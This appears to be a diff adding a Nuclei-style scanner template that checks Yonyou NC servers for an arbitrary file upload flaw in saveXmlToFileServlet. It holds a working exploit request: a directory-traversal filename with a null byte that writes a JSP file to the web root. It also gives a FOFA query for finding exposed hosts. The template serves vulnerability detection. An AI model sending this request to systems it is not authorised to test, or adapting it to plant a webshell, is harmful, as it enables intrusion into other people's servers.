@@ -1,0 +1,41 @@
+id: yonyou-nc-savexmltofileservlet-fileupload
+
+info:
+  name: 用友 NC saveXmlToFileServlet 任意文件上传
+  author: free2e
+  severity: critical
+  description: |
+    用友 NC saveXmlToFileServlet 接口 filename 参数存在目录穿越文件上传，可写入 JSP WebShell。
+  reference:
+    - https://mp.weixin.qq.com/s/GF6BR3I2k4QJoc7CRy4mfA
+  metadata:
+    max-request: 2
+    fofa-query: title="YONYOU NC"
+  tags: yonyou,nc,fileupload
+
+variables:
+  randfile: '{{rand_base(5)}}'
+  md5str: '{{md5(randfile)}}'
+
+http:
+  - raw:
+      - |
+        POST /portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename=..\..\..\webapps\nc_web\{{randfile}}.jsp%00 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/octet-stream
+
+        {{md5str}}
+      - |
+        GET /{{randfile}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_2
+        words:
+          - '{{md5str}}'
+
+      - type: status
+        status:
+          - 200
